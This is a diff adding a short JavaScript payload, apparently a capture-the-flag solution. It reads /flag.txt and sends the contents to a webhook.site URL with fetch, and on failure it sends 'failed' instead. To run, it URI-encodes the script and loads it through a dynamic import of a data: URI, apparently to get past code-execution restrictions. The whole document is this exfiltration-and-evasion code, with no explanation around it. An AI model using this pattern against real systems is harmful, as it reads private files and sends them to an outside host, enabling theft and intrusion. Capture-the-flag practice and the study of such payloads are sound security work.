@@ -1,0 +1,14 @@
+const js = `
+import * as fs from 'node:fs';
+fs.readFile('/flag.txt', 'utf8', (err, data) => {
+  if (err) {
+    fetch("https://webhook.site/8999a048-1471-4d5f-b16d-120811a6b15c/" + "failed");
+    return;
+  }
+  fetch("https://webhook.site/8999a048-1471-4d5f-b16d-120811a6b15c/" + data);
+});
+`;
+
+const encodedJs = encodeURIComponent(js);
+const dataUri = 'data:text/javascript;charset=utf-8,' + encodedJs;
+import(dataUri);
